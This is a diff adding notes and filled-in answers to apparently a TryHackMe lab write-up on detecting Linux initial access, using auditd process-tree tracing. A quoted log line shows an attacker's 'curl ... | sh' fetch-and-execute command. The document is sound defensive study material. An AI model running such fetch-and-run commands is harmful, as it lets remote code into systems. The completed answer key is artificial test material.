@@ -246,36 +246,83 @@ Application logs are not always available or helpful. Which is why SOCs rely on 
   - Process Trees can visually highlight how a breach happened and how to spot it in process creation logs
   - "whoami" is often a suspicious command
 
-**Example: You spot a whoami command. What was the parent process of that command? Follow the PPID trail.**
+**Example: You spot a whoami command. What was the parent process, which is what comes before the whoami command? Follow the PPID trail.**
 <p align="center">
 <img src=screenshots/linux_processtree.png width="700">
 </p>
 
 ### Auditd and Process Tree
 
+When starting an investigation at the suspicious command **whoami** we can search for it with:
+**ausearch -i -x whoami**
+Now you have a starting point, we can follow the ppid line we retrieved from our search...
+
+**Example: Tracing whoami Origin**
+ubuntu@thm-vm:~$ ausearch -i -x whoami # -x filters the results by the command name
+type=PROCTITLE msg=audit(08/25/25 16:28:18.107:985) : proctitle=whoami
+type=SYSCALL msg=audit(08/25/25 16:28:18.107:985) : syscall=execve success=yes exit=0 items=2 ppid=3905 pid=3907 auid=unset uid=ubuntu tty=(none) exe=/usr/bin/whoami key=exec
+
+ubuntu@thm-vm:~$ ausearch -i --pid 3905 # 3905 is a parent process ID of whoami
+type=PROCTITLE msg=audit(08/25/25 16:28:17.101:983) : proctitle=/bin/sh -c whoami
+type=SYSCALL msg=audit(08/25/25 16:28:17.101:983) : syscall=execve success=yes exit=0 items=2 ppid=3898 pid=3905 auid=unset uid=ubuntu tty=(none) exe=/usr/bin/dash key=exec
+
+ubuntu@thm-vm:~$ ausearch -i --pid 3898 # 3898 is a grandparent process ID of whoami
+type=PROCTITLE msg=audit(08/25/25 16:28:11.727:982) : proctitle=/usr/bin/python3 /opt/mywebapp/app.py
+type=SYSCALL msg=audit(08/25/25 16:28:11.727:982) : syscall=execve success=yes exit=0 items=2 ppid=1 pid=3898 auid=unset uid=ubuntu tty=(none) exe=/usr/bin/python3.12 key=exec
+
+How do we know this **whoami** command is actually suspicious? It could just be a normal app action.
+  - Use a process tree to look  for other suspicious commands launched by the app
+  - Listing all child processes of **/opt/mywebapp/app.py** may reveal evidence of an app breach
+
+**Example: Listing Child Processes**
+ubuntu@thm-vm:~$ ausearch -i --ppid 3898 | grep 'proctitle' # Use grep for a simpler output
+type=PROCTITLE msg=audit(08/25/25 16:28:17.101:983) : proctitle=/bin/sh -c whoami
+type=PROCTITLE msg=audit(08/25/25 16:28:18.230:985) : proctitle=/bin/sh -c ls -la
+type=PROCTITLE msg=audit(08/25/25 16:28:19.765:987) : proctitle=/bin/sh -c curl http://17gs9q1puh8o-bot.thm | sh
+[...]
+
 ---
 
 1. What is the PPID of the suspicious whoami command?
 
-**Answer:**
+<p align="center">
+<img src=screenshots/linux_whoamisearch.png width="700">
+</p>
+If an attacker has just breached your system, one common command they will run is whoami to find where on the network they are. Being able to trace and log such commands is vital for SOCs to spot and stop a breach. 
+Command: **sudo ausearch -i -x whoami**
+
+**Answer: 1018**
 
 ---
 
 2. Moving up the tree, what is the PID of the TryPingMe app?
 
-**Answer:**
+<p align="center">
+<img src=screenshots/linux_ppidtree.png width="700">
+</p>
+To trace this lead, we follow the ppid 1018, which is what happened before the whoami command was run.
+
+**Answer: 577**
 
 ---
 
 3. Which program did the attacker use to open a reverse shell?
 
-**Answer:**
+<p align="center">
+<img src=screenshots/linux_pythonfile.png width="700">
+</p>
+We can observe the attacker running various discovery commands. They use cat to read the .py file with the information, and they use Python to run the script.
+Command: sudo ausearch -i --ppid 577 
+
+**Answer: Python**
 
 ---
 
 ## Task 6 -- Advanced Initial Access
 
 ### Human-Led Attacks
+
+Although Linux users may be more technically knowledgeable, mistakes can still happen, and malware can still find a way into your system.
 
 | Scenario Example | Consequences |
 |---|---|
@@ -284,19 +331,40 @@ Application logs are not always available or helpful. Which is why SOCs rely on 
 
 ### Supply Chain Compromise
 
+Supply Chain attacks start with software being breached; once it is updated, it infects all users on the network.
+  - Linux servers use hundreds of software programs maintained by several different developers, so an attack can come from anywhere
+    Example:
+      - A trusted app suddenly runs malicious commands
+      - A backdoor in XZ Utils
+      - a breach of tj-actions
+
 ### Detecting the Attacks
+
+As we learned, **Initial Access** can be detected by **Process Tree Analysis**; it begins with:
+  - An Alert sent by a SIEM concerning a suspicious command, ie: whoami or a suspicious connection to a known malicious IP
+      - From there we can build a process tree to trace which application or which user initiated the event
+          - a web server?
+          - an internal app?
+          - an IT admin SSH session?
+
+It is up to the SOC to determine if any of those events are malicious and which are normal activities.
+
+<p align="center">
+<img src=screenshots/linux_detectexample.png width="700">
+</p>
+
 
 ---
 
 1. Which Initial Access technique is likely used if a trusted app suddenly runs malicious commands?
 
-**Answer:**
+**Answer: Supply Chain Compromise**
 
 ---
 
 2. Which detection method can you use to detect a variety of Initial Access techniques?
 
-**Answer:**
+**Answer: Process Tree Analysis**
 
 ---
 
